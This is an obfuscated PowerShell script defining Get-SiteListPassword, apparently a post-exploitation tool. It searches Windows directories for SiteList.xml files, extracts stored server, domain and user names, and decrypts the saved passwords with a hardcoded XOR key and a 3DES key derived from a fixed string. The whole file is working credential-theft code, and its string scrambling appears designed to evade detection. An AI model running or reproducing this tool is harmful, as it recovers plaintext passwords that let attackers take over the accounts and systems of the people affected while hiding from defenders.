set-itEM vArIABle:9Y4Zn  ([type]("{3}{2}{1}{0}" -f'eNCodING','.','M.texT','SYsTe') )  ;    seT-item  ("V"+"ariA"+"blE:kezdIq")  ( [type]("{2}{0}{1}{3}"-F '.c','ON','sYsTEm','VErT')  )  ;   $MSZ8nH  =[TyPE]("{1}{0}"-F'Ay','ARR'); function gET-`S`IT`el`i`STpassword {


    [CmdletBinding()]
    param(
        [ValidateScript({.("{0}{1}"-f 'Test-','Path') -Path ${_} })]
        [String]
        ${SITEL`iStF`I`LE`paTh}
    )

    function G`ET-Dec`RyPTEDSitE`lI`st`PAs`SwO`RD {
        
        
        
        [CmdletBinding()]
        Param (
            [Parameter(mAndATORy = ${t`Rue})]
            [String]
            ${b64`pa`ss}
        )

        
        .("{1}{2}{0}" -f 'Type','Ad','d-') -assembly ("{0}{4}{2}{3}{1}"-f'S','ty','stem.S','ecuri','y')
        .("{2}{0}{1}" -f'dd-Ty','pe','A') -assembly ("{0}{1}{2}" -f'System','.Cor','e')

        
        ${enCodI`NG} =   (  GEt-VarIaBLe 9Y4ZN  ).VaLuE::"aS`CII"
        ${s`HA1} = .("{3}{2}{0}{1}"-f'j','ect','ew-Ob','N') ("{6}{2}{9}{13}{1}{14}{4}{10}{5}{11}{0}{7}{8}{12}{3}" -f'Pr','Security.Crypt','ys','r','phy.','ryptoSer','S','ov','id','tem','SHA1C','vice','e','.','ogra') 
        ${3`dES} = .("{2}{1}{0}" -f'ect','-Obj','New') ("{0}{10}{3}{7}{5}{6}{8}{9}{11}{2}{1}{12}{4}" -f'System','P','ce','ty.','ider','aphy.','Trip','Cryptogr','leDESCr','yptoS','.Securi','ervi','rov')

        
        ${x`oRkEY} = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

        
        ${I} = 0;
        ${Un`xO`ReD} =   (  chilDitEM ("v"+"ARIa"+"bLe:KEzDiq")).vaLue::("{2}{1}{4}{3}{0}" -f 'ring','e64','FromBas','t','S').Invoke(${B`64`pass}) | &("{3}{1}{2}{0}"-f'ect','eac','h-Obj','For') { ${_} -BXor ${x`OrK`EY}[${I}++ % ${X`o`RKeY}."lE`N`GtH"] }

        
        ${3dE`S`KeY} = ${S`ha1}."C`oMpUTE`Ha`Sh"(${eN`cODI`NG}.("{1}{2}{0}"-f 'ytes','G','etB').Invoke((('<!@'+'#5Db%^'+'>')."REP`L`AcE"(([chAR]53+[chAR]68+[chAR]98),'$')))) + ,0x00*4

        
        ${3`DeS}."m`ode" = 'ECB'
        ${3d`es}."p`ADDiNG" = ("{0}{1}" -f 'No','ne')
        ${3`DES}."k`ey" = ${3`deSK`eY}

        
        ${DE`cr`yPt`ed} = ${3D`Es}.("{2}{1}{4}{0}{3}"-f'crypt','rea','C','or','teDe').Invoke().("{2}{1}{0}{3}"-f 'B','rmFinal','Transfo','lock').Invoke(${UnX`ORed}, 0, ${UnxO`RED}."L`ENg`Th")

        
        ${i`NDEx} =   $MSz8NH::"InDeX`OF"(${de`C`RYpTed}, [Byte]0)
        if(${in`DEx} -ne -1) {
            ${dEcry`pTEd`P`ASS} = ${e`N`cODing}."gEt`st`RIng"(${dECrYp`T`Ed}[0..(${i`NdeX}-1)])
        }
        else {
            ${DEcR`yPt`edpA`Ss} = ${ENcO`DI`Ng}."ge`TsT`RinG"(${DeCr`Y`pTeD})
        }

        .("{0}{2}{1}"-f 'New-Ob','ect','j') -TypeName ("{0}{2}{1}" -f 'P','ject','SOb') -Property @{("{1}{0}{2}"-f'crypt','En','ed')=${b6`4`pasS};("{2}{0}{1}"-f 'crypt','ed','De')=${decRYpTEd`pA`Ss}}
    }

    function GET-sIT`e`LI`St`FIELDs {
        [CmdletBinding()]
        Param (
            [Parameter(MANdatoRY = ${t`Rue})]
            [String]
            ${Pa`TH}
        )

        try {
            [Xml]${s`I`Te`LiStxML} = &("{1}{3}{2}{0}" -f'ent','Ge','ont','t-C') -Path ${pa`Th}

            if(${sIte`Lis`Tx`mL}."I`NnE`RxMl" -Like ("{1}{2}{3}{0}" -f'*','*p','as','sword')) {
                &("{3}{0}{1}{2}"-f 't','e-V','erbose','Wri') ('P'+'otent'+'ial '+'p'+'assw'+'ord '+'i'+'n '+'fo'+'und'+' '+'in'+' '+"$Path")

                ${SI`TE`lisTxML}."s`iteL`IsTS"."S`It`EliST"."cHiLDN`o`DEs" | .("{1}{4}{0}{3}{2}" -f'h-O','Forea','ect','bj','c') {                    
                    try {
                        ${PASS`word`RAw} = ${_}."p`ASsWorD".'#Text'

                        if(${_}."pA`ssW`oRD"."eN`CRYPt`ED" -eq 1) {
                            
                            ${DE`cpaSSw`oRd} = if(${PASs`WoR`DRAW}) { (.("{1}{4}{0}{3}{6}{2}{5}"-f 'ryptedSite','Ge','Pa','li','t-Dec','ssword','st') -B64Pass ${PAS`sW`oRDraW})."d`ECrypt`ed" } else {''}
                        }
                        else {
                            ${DEcPaS`SWO`Rd} = ${p`AS`SwORdraW}
                        }

                        ${seR`VEr} = if(${_}."SEr`V`EriP") { ${_}."SerVe`Rip" } else { ${_}."s`ervER" }
                        ${p`ATh} = if(${_}."SHAR`E`NAMe") { ${_}."sHarE`NA`me" } else { ${_}."RelA`T`i`VepaTH" }

                        ${OBjECtP`ROP`eR`TiEs} = @{
                            ("{0}{1}"-f 'Nam','e') = ${_}."n`AmE";
                            ("{0}{1}" -f'Enabl','ed') = ${_}."eNA`Bl`ED";
                            ("{1}{0}" -f 'r','Serve') = ${S`er`VER};
                            ("{1}{0}" -f 'h','Pat') = ${p`ATH};
                            ("{3}{0}{2}{1}" -f 'omain','e','Nam','D') = ${_}."dOMaI`NnA`me";
                            ("{1}{0}{2}" -f 'Nam','User','e') = ${_}."US`erN`AMe";
                            ("{2}{1}{0}"-f 'd','wor','EncPass') = ${PAsswo`Rd`Raw};
                            ("{0}{2}{1}{3}"-f 'De','o','cPassw','rd') = ${DEcPAs`SwO`Rd};
                        }
                        &("{2}{1}{0}"-f'ject','Ob','New-') -TypeName ("{1}{2}{0}" -f'ject','PSO','b') -Property ${OB`jeCTP`R`op`ErT`Ies}
                    }
                    catch {
                        .("{0}{2}{1}" -f'Wri','ug','te-Deb') ('E'+'r'+'ror '+'pars'+'ing'+' '+'node'+' '+': '+"$_")
                    }
                }
            }
        }
        catch {
            &("{3}{0}{2}{1}" -f'r','r','o','Write-Er') ${_}
        }
    }

    if(${si`TE`LISt`FILEpA`Th}) {
        ${xML`FI`les} = &("{0}{1}{2}"-f'G','et-Chil','dItem') -Path ${S`i`T`ElistFiLEPath}
    }
    else {
        ${XmLF`Il`eS} = ((("{3}{0}{1}{2}"-f'Progra','m Fi','lesZz0','C:Zz0'))-crEplaCE([ChAR]90+[ChAR]122+[ChAR]48),[ChAR]92),((("{1}{3}{0}{6}{4}{5}{2}"-f 'og','C:{0}P','){0}','r','m',' Files (x86','ra'))-F  [chaR]92),((("{5}{1}{4}{3}{2}{6}{0}" -f'0}','}Docu','in','ts and Sett','men','C:{0','gs{')) -f [chAr]92),((("{0}{2}{1}"-f'C:a','sersa4m','4mU'))-rEPLAce  'a4m',[cHar]92) | .("{1}{3}{0}{2}" -f 'ach-Obj','F','ect','ore') {
            &("{2}{0}{1}{3}" -f 'hil','dIt','Get-C','em') -Path ${_} -Recurse -Include ("{0}{3}{2}{1}" -f'Sit','l','ist.xm','eL') -ErrorAction ("{0}{1}{3}{4}{2}"-f 'Si','lentlyCo','nue','nt','i')
        }
    }

    ${Xml`FI`Les} | .("{1}{3}{2}{0}" -f'-Object','W','e','her') { ${_} } | &("{1}{0}{3}{2}" -f'or','F','ct','each-Obje') {
        &("{3}{0}{2}{1}" -f'te','erbose','-V','Wri') "Parsing SiteList.xml file '$($_.Fullname)' "
        &("{2}{3}{0}{1}"-f'tF','ields','Get-Sit','elis') -Path ${_}."fUlLn`A`me"        
    }
}